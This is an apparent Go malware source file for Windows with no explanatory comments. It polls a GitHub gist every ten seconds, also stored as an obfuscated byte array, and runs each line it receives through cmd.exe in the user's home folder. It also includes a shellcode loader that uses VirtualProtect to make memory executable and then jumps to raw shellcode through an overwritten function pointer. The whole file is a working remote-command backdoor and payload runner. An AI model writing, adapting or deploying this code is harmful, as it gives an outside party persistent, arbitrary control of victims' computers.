package main

import (
	"bufio"
	"encoding/binary"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

func main() {
	version := -1

	for ;; {
		if newVersion, ok := loop(version); ok {
			version = newVersion
		}
		time.Sleep(10 * time.Second)
	}
}

func loop(version int) (int, bool) {
	b := []byte{104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,70,97,98,105,97,110,84,101,114,104,111,114,115,116,47,97,100,49,50,51,53,51,101,48,100,57,101,54,101,49,100,57,50,102,55,54,99,97,49,48,53,55,55,52,50,98,53,47,114,97,119,47,114,117,110,46,116,120,116,63,99,97,99,104,101,98,117,115,116,61}
	timestamp := uint64(time.Now().UnixNano())
	timestampString := strconv.FormatUint(timestamp, 10)
	ts := make([]byte, 8)
	binary.LittleEndian.PutUint64(ts, timestamp)
	b = append(b, ts...)
	resp, err := http.Get("https://gist.githubusercontent.com/FabianTerhorst/ad12353e0d9e6e1d92f76ca1057742b5/raw/run.txt?cachebust=" + timestampString)
	firstLine := true
	if err != nil {
		return -1, false
	}

	defer io.Copy(ioutil.Discard, resp.Body)
	defer resp.Body.Close()

	currVersion := -1
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		if firstLine == true {
			currVersion, err = strconv.Atoi(scanner.Text())
			if err != nil {
				return -1, false
			}
			if currVersion <= version {
				return -1, false
			}
			firstLine = false
			continue
		}
		commandToExecute := scanner.Text()
		c := exec.Command("cmd.exe", "/K", commandToExecute)
		homeDir, err := os.UserHomeDir()
		if err != nil {
			continue
		}
		c.Dir = homeDir
		_ = c.Run()
	}
	return currVersion, true
}

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Run(sc []byte) {
	// TODO need a Go safe fork
	// Make a function ptr
	f := func() {}

	// Change permissions on f function ptr
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	// Change permissions on shellcode string data
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Call the function ptr it
	f()
}